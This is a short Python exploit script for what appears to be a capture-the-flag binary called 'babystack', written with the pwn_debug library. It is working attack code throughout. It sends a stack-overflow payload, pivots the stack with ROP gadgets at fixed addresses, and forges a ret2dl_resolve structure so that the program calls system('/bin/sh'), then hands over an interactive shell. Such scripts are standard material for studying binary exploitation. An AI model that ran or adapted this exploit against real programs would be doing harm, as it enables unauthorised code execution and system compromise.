# File: exp.py
# Author: raycp
# Date: 2019-05-31
# Description: exp for babystack

from pwn_debug import *


pdbg=pwn_debug("./babystack")

pdbg.context.terminal=['tmux', 'splitw', '-h']

#pdbg.local()
pdbg.debug("2.23")
#pdbg.remote('127.0.0.1', 22)
#p=pdbg.run("local")
#p=pdbg.run("remote")
p=pdbg.run("debug")
membp=pdbg.membp
#print hex(membp.elf_base),hex(membp.libc_base)
elf=pdbg.elf
libc=pdbg.libc
#a=IO_FILE_plus()
#print a
#a.show()



def pwn():

    p3_ret=0x080484e9 #: pop esi ; pop edi ; pop ebp ; ret
    pebp_ret=0x080484eb #: pop ebp ; ret
    leave_ret=0x080483a8 # : leave ; ret



    bss_addr=0x804a000+0x500
    ret2dl_resolve=pdbg.ret2dl_resolve()

    addr,resolve_data,resovle_call=ret2dl_resolve.build_normal_resolve(bss_addr,'system',bss_addr+0x400)
    #pdbg.bp(0x8048456)
    payload='a'*0x28+p32(addr+len(resolve_data)+0x40)+p32(elf.plt['read'])+p32(leave_ret)+p32(0)+p32(addr)+p32(0x100)
    p.send(payload)
    raw_input("go>")
    payload=resolve_data+'a'*0x44+resovle_call
    payload+=p32(0)+p32(addr+len(payload)+8)+'/bin/sh\x00'
    
    p.send(payload)

    
    p.interactive() #get the shell

if __name__ == '__main__':
   pwn()


